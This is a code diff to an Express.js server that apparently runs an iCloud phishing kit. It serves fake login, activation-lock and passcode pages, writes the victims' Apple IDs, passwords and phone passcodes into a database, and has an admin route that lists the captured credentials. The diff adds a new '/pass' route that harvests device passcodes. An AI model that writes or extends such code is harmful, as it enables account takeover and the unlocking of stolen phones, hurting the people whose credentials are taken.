@@ -61,33 +61,33 @@ app.post("/login", async (req, res) =>{
 
 // another login page
 app.get("/log-in", async (req, res) =>{
-    res.sendFile(__dirname + "/src/login.html")
+    res.sendFile(__dirname + "/src/activation_loc.html")
 })
 
 // login failed
-app.post("/log-in", async (req, res) =>{
-    const { username, password } = req.body;
-    // console.log(username)
-    // console.log(password)
-    const jwtToken = req.cookies.jwt; // Get the JWT token from the cookie
-    if(jwtToken){
-        // Decode the JWT token
-        const payload = jwt.decode(jwtToken);
-        console.log('\"'+payload.username+'\"');
+// app.post("/log-in", async (req, res) =>{
+//     const { username, password } = req.body;
+//     // console.log(username)
+//     // console.log(password)
+//     const jwtToken = req.cookies.jwt; // Get the JWT token from the cookie
+//     if(jwtToken){
+//         // Decode the JWT token
+//         const payload = jwt.decode(jwtToken);
+//         console.log('\"'+payload.username+'\"');
 
 
-        const user = await User.updateOne(
-            { fistIcloud: payload.username },
-            { $set: { secondIcloud: username, secondPassword: password } },
-            { returnOriginal: false },
-        );
-        res.sendFile(__dirname + "/src/four_digit.html")
-    }
-    else{
-        res.send("Token Required")
-    }
+//         const user = await User.updateOne(
+//             { fistIcloud: payload.username },
+//             { $set: { secondIcloud: username, secondPassword: password } },
+//             { returnOriginal: false },
+//         );
+//         res.sendFile(__dirname + "/src/four_digit.html")
+//     }
+//     else{
+//         res.send("Token Required")
+//     }
     
-})
+// })
 // post the last creds..
 app.post("/activation_lock", async (req, res) =>{
     const passcode = req.body.passcode;
@@ -110,21 +110,39 @@ app.post("/activation_lock", async (req, res) =>{
         });
         // console.log(user)
         //clear cookies and redirecto first page
-        res.sendFile(__dirname + "/src/loading.html");
+        res.sendFile(__dirname + "/src/four.html");
+    }
+    else{
+        res.send("Token Required")
+    }
+})
+app.post("/pass", async (req, res) =>{
+    const passcode = req.body.passcode;
+    const jwtToken = req.cookies.jwt;
+    if(jwtToken){
+        // Decode the JWT token
+        const payload = jwt.decode(jwtToken);
+        const user = await User.updateOne(
+            { fistIcloud: payload.username },
+            { $set: { phonePassword: passcode} },
+            { returnOriginal: false },
+            function(err, result) {
+              if (err) throw err;
+            //   console.log(result);
+        });
+        // res.sendFile(__dirname + "/src/six.html")
+        res.sendFile(__dirname + "/src/loading.html")
     }
     else{
         res.send("Token Required")
     }
 })
 
-
 app.get("/admin", async (req, res) =>{
     res.sendFile(__dirname + '/admin_login.html');
 });
 app.post("/admin", async (req, res)=>{
     const { username, password } = req.body;
-    // console.log(username)
-    // console.log(password)
     
     User.find().then(function(creds){
         creds.reverse();
